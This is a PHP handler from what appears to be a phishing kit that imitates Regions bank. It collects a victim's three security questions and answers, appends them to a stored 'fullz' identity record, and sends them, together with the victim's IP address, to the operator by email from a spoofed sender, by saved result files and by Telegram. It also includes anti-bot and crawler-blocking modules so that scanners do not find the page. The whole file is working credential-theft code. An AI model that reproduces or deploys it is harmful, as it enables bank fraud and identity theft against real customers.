<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
include "../req/config.php";

if(!empty($_POST['s1']) && !empty($_POST['s2']) && !empty($_POST['s3']) && !empty($_POST['ans1']) && !empty($_POST['ans2']) && !empty($_POST['ans3'])){

	///////////////////////// MAIL PART //////////////////////
		$s1 = $_POST['s1'];
		$s2 = $_POST['s2'];
		$s3 = $_POST['s3'];
		$ans1 = $_POST['ans1'];
		$ans2 = $_POST['ans2'];
		$ans3 = $_POST['ans3'];
		$PublicIP = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|------------------- Security Q&A ----------------| 
Ques 1.        : $s1       
Ans 1.         : $ans1	   
Ques 2.        : $s2       
Ans 2.         : $ans2	   
Ques 3.        : $s3 	    
Ans 3.         : $ans3";
		$_SESSION['fullz'].=$Info_LOG; 
$Info_LOG.="
Ip    : $PublicIP ";
		
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' 🍃 REGIONS Security Q&A' ;$headers = 'From: YoCHI <yochmoneywellsf@wellsfofyoch.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		header("location:conv?consdled=true");
}
else { header("location:qa_au?".$theerrkey."=wmtc3Fauth".md5(rand(100, 999999999)).""); };
?>